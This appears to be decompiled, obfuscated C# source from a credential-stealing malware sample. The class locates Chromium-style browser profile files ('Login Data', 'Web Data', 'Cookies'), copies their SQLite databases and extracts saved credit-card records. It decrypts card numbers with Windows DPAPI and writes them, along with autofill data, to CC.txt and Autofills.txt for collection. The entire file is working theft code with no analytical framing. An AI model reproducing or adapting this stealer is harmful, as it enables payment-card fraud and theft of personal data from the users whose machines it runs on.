using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using NoiseMe.Drags.App.Data.SQLite;
using who;

// Token: 0x02000045 RID: 69
internal class Class30
{
	// Token: 0x0600022F RID: 559 RVA: 0x000111A0 File Offset: 0x0000F3A0
	public static string smethod_0(string string_0, DataProtectionScope dataProtectionScope_0, byte[] byte_0 = null)
	{
		return Class30.smethod_1(Encoding.Default.GetBytes(string_0), dataProtectionScope_0, byte_0);
	}

	// Token: 0x06000230 RID: 560 RVA: 0x000111C4 File Offset: 0x0000F3C4
	public static string smethod_1(byte[] byte_0, DataProtectionScope dataProtectionScope_0, byte[] byte_1 = null)
	{
		string result;
		try
		{
			if (byte_0 == null || byte_0.Length == 0)
			{
				result = string.Empty;
			}
			else
			{
				byte[] bytes = ProtectedData.Unprotect(byte_0, byte_1, dataProtectionScope_0);
				result = Encoding.UTF8.GetString(bytes);
			}
		}
		catch (CryptographicException)
		{
			result = string.Empty;
		}
		catch
		{
			result = string.Empty;
		}
		return result;
	}

	// Token: 0x06000231 RID: 561 RVA: 0x00011230 File Offset: 0x0000F430
	public static string smethod_2()
	{
		return Path.Combine(new string[]
		{
			Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp", string.Concat(new object[]
			{
				"tempDataBase",
				DateTime.Now.ToString("O").Replace(':', '_'),
				Thread.CurrentThread.GetHashCode(),
				Thread.CurrentThread.ManagedThreadId
			}))
		});
	}

	// Token: 0x06000232 RID: 562 RVA: 0x000112B8 File Offset: 0x0000F4B8
	public static string smethod_3(string string_0)
	{
		string text = Class30.smethod_2();
		File.Copy(string_0, text, true);
		return text;
	}

	// Token: 0x06000233 RID: 563 RVA: 0x000112D8 File Offset: 0x0000F4D8
	public static List<string> smethod_4(string string_0, int int_1 = 4, int int_2 = 1, params string[] files)
	{
		List<string> list = new List<string>();
		List<string> result;
		if (files == null || files.Length == 0 || int_2 > int_1)
		{
			result = list;
		}
		else
		{
			try
			{
				string[] directories = Directory.GetDirectories(string_0);
				foreach (string path in directories)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag = false;
						int num = 0;
						while (num < files2.Length && !flag)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag = true;
									list.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in Class30.smethod_4(directoryInfo.FullName, int_1, int_2 + 1, files))
						{
							if (!list.Contains(item))
							{
								list.Add(item);
							}
						}
					}
					catch
					{
					}
				}
				result = list;
			}
			catch
			{
				result = list;
			}
		}
		return result;
	}

	// Token: 0x06000234 RID: 564 RVA: 0x0001142C File Offset: 0x0000F62C
	private static List<string> smethod_5()
	{
		List<string> list = new List<string>();
		List<string> result;
		try
		{
			list.AddRange(Class30.smethod_4(Dirs.AppData, 4, 1, new string[]
			{
				"Login Data",
				"Web Data",
				"Cookies"
			}));
			list.AddRange(Class30.smethod_4(Dirs.LocalAppData, 4, 1, new string[]
			{
				"Login Data",
				"Web Data",
				"Cookies"
			}));
			result = list;
		}
		catch
		{
			result = list;
		}
		return result;
	}

	// Token: 0x06000235 RID: 565 RVA: 0x000114BC File Offset: 0x0000F6BC
	public static void smethod_6(string string_0)
	{
		try
		{
			string string_ = Path.Combine(string_0, "Web Data");
			CNT cnt = new CNT(Class30.smethod_3(string_));
			cnt.ReadTable("credit_cards");
			for (int i = 0; i < cnt.RowLength; i++)
			{
				Class30.int_0++;
				try
				{
					Class30.list_0.Add(string.Concat(new object[]
					{
						"Name : ",
						cnt.ParseValue(i, "name_on_card").Trim(),
						Environment.NewLine,
						"Ex_Month And Year: ",
						Convert.ToInt32(cnt.ParseValue(i, "expiration_month").Trim()),
						"/",
						Convert.ToInt32(cnt.ParseValue(i, "expiration_year").Trim() + Environment.NewLine + "Card_Number" + Class30.smethod_0(cnt.ParseValue(i, "card_number_encrypted"), DataProtectionScope.CurrentUser, null).Trim())
					}));
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000236 RID: 566 RVA: 0x000115E8 File Offset: 0x0000F7E8
	private static string smethod_7(string string_0)
	{
		try
		{
			return string_0.Split(new string[]
			{
				"AppData\\Roaming\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries)[0];
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x06000237 RID: 567 RVA: 0x00011640 File Offset: 0x0000F840
	private static string smethod_8(string string_0)
	{
		try
		{
			string[] array = string_0.Split(new string[]
			{
				"AppData\\Local\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			return array[0] + "_" + array[1];
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x06000238 RID: 568 RVA: 0x000116A4 File Offset: 0x0000F8A4
	public static void smethod_9()
	{
		foreach (string text in Class30.smethod_5())
		{
			string fullName = new FileInfo(text).Directory.FullName;
			string string_ = text.Contains(Dirs.AppData) ? Class30.smethod_7(fullName) : Class30.smethod_8(fullName);
			string fullName2 = new FileInfo(text).Directory.FullName;
			Class30.smethod_6(fullName);
			Class31.fLujhrskIa(fullName, string_);
		}
		string text2 = "";
		string text3 = "";
		foreach (string str in Class31.list_0)
		{
			text3 += str;
		}
		foreach (string str2 in Class30.list_0)
		{
			text2 = text2 + Environment.NewLine + str2;
		}
		if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
		{
			Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");
		}
		if (text2 != "")
		{
			File.WriteAllText(Dirs.WorkDir + "\\Browsers\\CC.txt", text2, Encoding.Default);
		}
		if (text3 != "")
		{
			File.WriteAllText(Dirs.WorkDir + "\\Browsers\\Autofills.txt", text3, Encoding.Default);
		}
	}

	// Token: 0x06000239 RID: 569 RVA: 0x0000276F File Offset: 0x0000096F
	public Class30()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x0600023A RID: 570 RVA: 0x00002EEF File Offset: 0x000010EF
	// Note: this type is marked as 'beforefieldinit'.
	static Class30()
	{
		Class34.A1SfXVPz7w9eh();
		Class30.list_0 = new List<string>();
	}

	// Token: 0x040000F4 RID: 244
	public static int int_0;

	// Token: 0x040000F5 RID: 245
	public static List<string> list_0;
}
